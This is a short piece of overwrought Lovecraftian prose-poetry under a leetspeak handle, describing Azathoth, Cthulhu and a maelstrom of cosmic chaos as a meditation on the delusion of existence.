 "-=[3L1(\)D /-\E0(\]=- sits in placid meloncholy whilst the world
which he so loathes crumbles around him. All is apathy in this
catalytic gestolt engine of chaos. Entrophy and sadness skulkingly
drift about transmorphing and transmongering the subtle whirl winds
which form within and without, these malign dusty devils from
thoughts and dreams beyond the veil of perception. Yet, now the
dizzying heights of which expressionless vortices measure, beyond
mortal scope and time, displace the shear earthly bounds, never
constrained by any grain of matter but only limited by man's
ignaminious thirsts and imaginations. Even now they dothe 'ere grow
to such chaotic amplitude that the maelstrom even alerts the
geniuses of infamy in the outermost reaches of the primordium. The
outer gods writhe restless in their spaces and times. Mighty
Cthulhu's slumber is almost rought to be broken. Screams in the
Dreamlands sheer the senses of nameless evil demi-gods, the likes
of blind white worms and tentacled horrors the sight of which would
stop the hearts of men at the mere witnessing of the horrid sounds
and locomotions, save for the handful of dark acolytes whom praise
the return of the Old Gods and other abhorrent manifestations of
which none shall speak. The Maelstrom of thoughts chaotic and
malevolent still continue to grow hour by hour , day through night,
and aeon to aeon... All the while Azathoth the blind demon sultan
before man, before stars, before time and before this beginning
itself, sits atop a cold black throne in the hub of existance
...floating at the beginning of creation. He laughs continually,
all the while, creating and destroying all things tangible and
intangible. As we each blink in and out of this terrible lie...this
unwaking nightmare, we mere mortals perceive in our dulled pitiful
attempts to label this delusion of what the meaning we believe in
when it comes to the concept of existance... Perhaps our limited
imaginations tell us more than we care to trust or believe in...."
